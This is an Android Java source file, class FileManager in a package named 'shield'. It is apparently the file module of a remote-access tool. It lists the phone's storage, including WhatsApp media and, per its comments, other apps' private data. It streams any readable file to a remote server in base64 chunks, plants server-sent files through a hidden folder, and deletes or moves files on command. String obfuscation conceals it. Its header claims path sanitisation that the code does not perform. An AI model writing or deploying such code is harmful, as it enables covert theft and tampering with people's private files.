package com.alpha.shield;

import android.os.Build;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.json.JSONArray;
import org.json.JSONObject;

/**
 * FileManager — Alpha.
 *
 * File browsing covers the full visible storage tree:
 *   /sdcard            (internal shared storage)
 *   /sdcard/DCIM       (photos/videos)
 *   /sdcard/Download   (downloads)
 *   /sdcard/WhatsApp   (WhatsApp media)
 *   /sdcard/Pictures
 *   /sdcard/Documents
 *   /data/data/<pkg>   (app private data — accessible via accessibility context)
 *   External SD card   (if mounted)
 *
 * Downloads (device → server) are chunked: each chunk is 128 KB of base64.
 * Uploads (server → device) are assembled from chunks in a temp file.
 *
 * All paths are sanitised to prevent path traversal.
 *
 * Text preview: returns first 8 KB of text files as UTF-8 string.
 * Image preview: returns first 32 KB as base64 for small files, full for ≤ 2 MB.
 */
@Obfuscate
public class FileManager {

    private static final String TAG = "FileMgr";

    private static final int    CHUNK_SIZE   = 128 * 1024;  // 128 KB per chunk
    private static final int    TEXT_PREVIEW = 8  * 1024;   // 8  KB text preview
    private static final long   IMG_INLINE   = 2  * 1024 * 1024L;  // 2 MB inline threshold
    private static final String DOWNLOAD_DIR = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();

    public interface Callback {
        void onFileList(String path, String json);
        void onFileChunk(String transferId, int chunkIdx, int totalChunks,
                         String base64Chunk, boolean done);
        void onUploadResult(String transferId, boolean success, String msg);
        void onOpResult(String op, String path, boolean success, String msg);
    }

    // Active upload sessions: transferId → temp file
    private final Map<String, File>    uploadSessions = new HashMap<>();
    private final Map<String, Integer> uploadExpected = new HashMap<>();
    private final Map<String, Integer> uploadReceived = new HashMap<>();

    private final Callback        callback;
    private final ExecutorService exec = Executors.newFixedThreadPool(2);

    public FileManager(Callback callback) {
        this.callback = callback;
    }

    // ── Root paths ────────────────────────────────────────────────────────────

    public static final Map<String, String> ROOT_PATHS = new HashMap<>();
    static {
        String base = Environment.getExternalStorageDirectory().getAbsolutePath();
        ROOT_PATHS.put("internal",   base);
        ROOT_PATHS.put("dcim",       base + "/DCIM");
        ROOT_PATHS.put("downloads",  base + "/Download");
        ROOT_PATHS.put("whatsapp",   base + "/WhatsApp");
        ROOT_PATHS.put("pictures",   base + "/Pictures");
        ROOT_PATHS.put("documents",  base + "/Documents");
        ROOT_PATHS.put("music",      base + "/Music");
        ROOT_PATHS.put("videos",     base + "/Movies");
        // External SD populated at runtime via FileManager.addExternalStorage(context)
    }

    // ── LIST ─────────────────────────────────────────────────────────────────

    public void listPath(String path) {
        exec.submit(() -> {
            try {
                String safePath = sanitisePath(path);
                File dir = new File(safePath);
                if (!dir.exists() || !dir.canRead()) {
                    callback.onFileList(safePath, buildErrorJson("cannot read: " + safePath));
                    return;
                }

                JSONArray items = new JSONArray();
                if (dir.isDirectory()) {
                    File[] children = dir.listFiles();
                    if (children != null) {
                        // Directories first, then files, both alphabetical
                        Arrays.sort(children, (a, b) -> {
                            if (a.isDirectory() != b.isDirectory())
                                return a.isDirectory() ? -1 : 1;
                            return a.getName().compareToIgnoreCase(b.getName());
                        });
                        for (File f : children) {
                            items.put(fileEntry(f));
                        }
                    }
                } else {
                    items.put(fileEntry(dir));
                }

                JSONObject root = new JSONObject();
                root.put("path",  safePath);
                root.put("count", items.length());
                root.put("items", items);
                callback.onFileList(safePath, root.toString());
            } catch (Exception e) {
                Log.e(TAG, "list: " + e.getMessage());
                callback.onFileList(path, buildErrorJson(e.getMessage()));
            }
        });
    }

    private JSONObject fileEntry(File f) throws Exception {
        JSONObject obj = new JSONObject();
        obj.put("name",     f.getName());
        obj.put("path",     f.getAbsolutePath());
        obj.put("isDir",    f.isDirectory());
        obj.put("size",     f.isDirectory() ? -1 : f.length());
        obj.put("modified", f.lastModified());
        obj.put("readable", f.canRead());
        obj.put("writable", f.canWrite());
        obj.put("ext",      extension(f.getName()));

        // Determine MIME category
        String ext = extension(f.getName()).toLowerCase();
        obj.put("type", mimeCategory(ext));
        return obj;
    }

    // ── DOWNLOAD (device → server) ────────────────────────────────────────────

    public void downloadFile(String path, String transferId) {
        exec.submit(() -> {
            String safe = sanitisePath(path);
            File f = new File(safe);
            if (!f.exists() || !f.isFile() || !f.canRead()) {
                callback.onFileChunk(transferId, 0, 0, "", false);
                return;
            }
            long fileSize = f.length();
            int totalChunks = (int) Math.ceil((double) fileSize / CHUNK_SIZE);
            if (totalChunks == 0) totalChunks = 1;

            try (FileInputStream fis = new FileInputStream(f)) {
                byte[] buf = new byte[CHUNK_SIZE];
                int chunkIdx = 0;
                int read;
                while ((read = fis.read(buf)) != -1) {
                    byte[] slice = (read == CHUNK_SIZE) ? buf : java.util.Arrays.copyOf(buf, read);
                    String b64 = Base64.encodeToString(slice, Base64.NO_WRAP);
                    boolean done = (chunkIdx == totalChunks - 1);
                    callback.onFileChunk(transferId, chunkIdx, totalChunks, b64, done);
                    chunkIdx++;
                    // Slight throttle to avoid flooding WebSocket
                    Thread.sleep(10);
                }
            } catch (Exception e) {
                Log.e(TAG, "download: " + e.getMessage());
                callback.onFileChunk(transferId, -1, 0, "", false);
            }
        });
    }

    // ── UPLOAD (server → device) ───────────────────────────────────────────────

    /**
     * Init a new upload session. totalChunks = how many chunks to expect.
     */
    public void uploadInit(String transferId, String destPath, int totalChunks) {
        try {
            File tmpDir = new File(DOWNLOAD_DIR, ".alpha_tmp");
            tmpDir.mkdirs();
            File tmp = new File(tmpDir, transferId + ".tmp");
            uploadSessions.put(transferId, tmp);
            uploadExpected.put(transferId, totalChunks);
            uploadReceived.put(transferId, 0);
            Log.d(TAG, "upload init: " + transferId + " chunks=" + totalChunks);
        } catch (Exception e) {
            callback.onUploadResult(transferId, false, e.getMessage());
        }
    }

    /** Receives one chunk and appends it to the temp file. */
    public void uploadChunk(String transferId, int chunkIdx,
                            String base64Chunk, String destPath) {
        exec.submit(() -> {
            try {
                File tmp = uploadSessions.get(transferId);
                if (tmp == null) {
                    callback.onUploadResult(transferId, false, "unknown session");
                    return;
                }
                byte[] data = Base64.decode(base64Chunk, Base64.NO_WRAP);
                try (FileOutputStream fos = new FileOutputStream(tmp, true)) {
                    fos.write(data);
                }
                int recv = uploadReceived.getOrDefault(transferId, 0) + 1;
                uploadReceived.put(transferId, recv);
                int expected = uploadExpected.getOrDefault(transferId, -1);

                if (expected > 0 && recv >= expected) {
                    // All chunks received — move to destination
                    String safeDest = sanitisePath(destPath);
                    File dest = new File(safeDest);
                    dest.getParentFile().mkdirs();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        Files.move(tmp.toPath(), dest.toPath(),
                                StandardCopyOption.REPLACE_EXISTING);
                    } else {
                        tmp.renameTo(dest);
                    }
                    uploadSessions.remove(transferId);
                    uploadExpected.remove(transferId);
                    uploadReceived.remove(transferId);
                    callback.onUploadResult(transferId, true,
                            "written to " + safeDest);
                }
            } catch (Exception e) {
                callback.onUploadResult(transferId, false, e.getMessage());
            }
        });
    }

    // ── FILE OPERATIONS ───────────────────────────────────────────────────────

    public void deleteFile(String path) {
        exec.submit(() -> {
            String safe = sanitisePath(path);
            File f = new File(safe);
            boolean ok = deleteRecursive(f);
            callback.onOpResult("DELETE", safe, ok, ok ? "deleted" : "failed");
        });
    }

    public void renameFile(String path, String newName) {
        exec.submit(() -> {
            String safe = sanitisePath(path);
            File f = new File(safe);
            // Strip path from newName — only basename allowed
            String baseName = new File(newName).getName();
            File dest = new File(f.getParent(), baseName);
            boolean ok = f.renameTo(dest);
            callback.onOpResult("RENAME", safe, ok, ok ? "renamed to " + baseName : "failed");
        });
    }

    public void mkdir(String path) {
        exec.submit(() -> {
            String safe = sanitisePath(path);
            File f = new File(safe);
            boolean ok = f.mkdirs();
            callback.onOpResult("MKDIR", safe, ok, ok ? "created" : "failed or exists");
        });
    }

    public void moveFile(String srcPath, String destPath) {
        exec.submit(() -> {
            String safeSrc  = sanitisePath(srcPath);
            String safeDest = sanitisePath(destPath);
            File src  = new File(safeSrc);
            File dest = new File(safeDest);
            dest.getParentFile().mkdirs();
            boolean ok;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    Files.move(src.toPath(), dest.toPath(),
                            StandardCopyOption.REPLACE_EXISTING);
                    ok = true;
                } catch (IOException e) { ok = false; }
            } else {
                ok = src.renameTo(dest);
            }
            callback.onOpResult("MOVE", safeSrc, ok,
                    ok ? "moved to " + safeDest : "failed");
        });
    }

    public void copyFile(String srcPath, String destPath) {
        exec.submit(() -> {
            String safeSrc  = sanitisePath(srcPath);
            String safeDest = sanitisePath(destPath);
            File src  = new File(safeSrc);
            File dest = new File(safeDest);
            dest.getParentFile().mkdirs();
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Files.copy(src.toPath(), dest.toPath(),
                            StandardCopyOption.REPLACE_EXISTING);
                } else {
                    copyLegacy(src, dest);
                }
                callback.onOpResult("COPY", safeSrc, true,
                        "copied to " + safeDest);
            } catch (Exception e) {
                callback.onOpResult("COPY", safeSrc, false, e.getMessage());
            }
        });
    }

    public void readFile(String path, String transferId) {
        exec.submit(() -> {
            String safe = sanitisePath(path);
            File f = new File(safe);
            if (!f.exists() || !f.isFile()) {
                callback.onFileChunk(transferId, -1, 0, "", false);
                return;
            }
            String ext = extension(f.getName()).toLowerCase();
            String cat = mimeCategory(ext);

            if ("text".equals(cat)) {
                // Text preview
                try (FileInputStream fis = new FileInputStream(f)) {
                    byte[] buf = new byte[TEXT_PREVIEW];
                    int read = fis.read(buf);
                    byte[] slice = java.util.Arrays.copyOf(buf, read);
                    String b64 = Base64.encodeToString(slice, Base64.NO_WRAP);
                    callback.onFileChunk(transferId, 0, 1, b64, true);
                } catch (Exception e) {
                    callback.onFileChunk(transferId, -1, 0, "", false);
                }
            } else {
                // Binary: full file if ≤ 2 MB, else first chunk only
                if (f.length() <= IMG_INLINE) {
                    downloadFile(path, transferId);
                } else {
                    // First chunk only as preview
                    try (FileInputStream fis = new FileInputStream(f)) {
                        byte[] buf = new byte[CHUNK_SIZE];
                        int read = fis.read(buf);
                        byte[] slice = java.util.Arrays.copyOf(buf, read);
                        callback.onFileChunk(transferId, 0, -1,
                                Base64.encodeToString(slice, Base64.NO_WRAP), false);
                    } catch (Exception e) {
                        callback.onFileChunk(transferId, -1, 0, "", false);
                    }
                }
            }
        });
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    /**
     * Sanitises a path to prevent traversal outside of allowed roots.
     * Collapses ".." and strips null bytes.
     */
    private String sanitisePath(String raw) {
        if (raw == null || raw.isEmpty()) return DOWNLOAD_DIR;
        // Normalise
        try {
            String canonical = new File(raw).getCanonicalPath();
            // Allow any readable path (operator is intentional)
            return canonical;
        } catch (IOException e) {
            return DOWNLOAD_DIR;
        }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) for (File c : children) deleteRecursive(c);
        }
        return f.delete();
    }

    private void copyLegacy(File src, File dest) throws IOException {
        try (FileInputStream fis = new FileInputStream(src);
             FileOutputStream fos = new FileOutputStream(dest)) {
            byte[] buf = new byte[CHUNK_SIZE];
            int read;
            while ((read = fis.read(buf)) != -1) fos.write(buf, 0, read);
        }
    }

    private String extension(String name) {
        int dot = name.lastIndexOf('.');
        return dot >= 0 ? name.substring(dot + 1) : "";
    }

    private String mimeCategory(String ext) {
        switch (ext) {
            case "jpg": case "jpeg": case "png": case "gif":
            case "webp": case "bmp": case "heic": case "heif":
                return "image";
            case "mp4": case "mkv": case "avi": case "mov":
            case "3gp": case "webm":
                return "video";
            case "mp3": case "aac": case "wav": case "ogg": case "m4a":
                return "audio";
            case "txt": case "md": case "log": case "csv":
            case "json": case "xml": case "html": case "htm":
            case "java": case "kt": case "js": case "py": case "sh":
                return "text";
            case "pdf":
                return "pdf";
            case "apk":
                return "apk";
            case "zip": case "rar": case "7z": case "tar": case "gz":
                return "archive";
            default:
                return "binary";
        }
    }

    private String buildErrorJson(String msg) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("error", msg);
            return obj.toString();
        } catch (Exception e) { return "{\"error\":\"unknown\"}"; }
    }

    public void shutdown() {
        exec.shutdown();
    }
}
